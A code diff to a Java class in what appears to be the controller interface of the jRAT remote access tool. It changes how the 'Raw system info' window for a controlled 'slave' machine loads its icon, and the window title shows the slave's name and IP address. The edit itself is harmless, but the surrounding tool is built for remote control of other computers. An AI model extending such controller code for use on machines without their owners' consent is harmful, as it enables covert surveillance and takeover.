@@ -1,6 +1,6 @@
 package jrat.controller.ui.frames;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 
 import java.util.HashMap;
@@ -17,7 +17,7 @@ public class FrameRawSystemInfo extends FrameTextPane {
 		instances.put(slave, this);
 		this.slave = slave;
 		super.setTitle("Raw system info - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
-		super.setIconImage(IconUtils.getIcon("computer").getImage());
+		super.setIconImage(Resources.getIcon("computer").getImage());
 	}
 
 	@Override
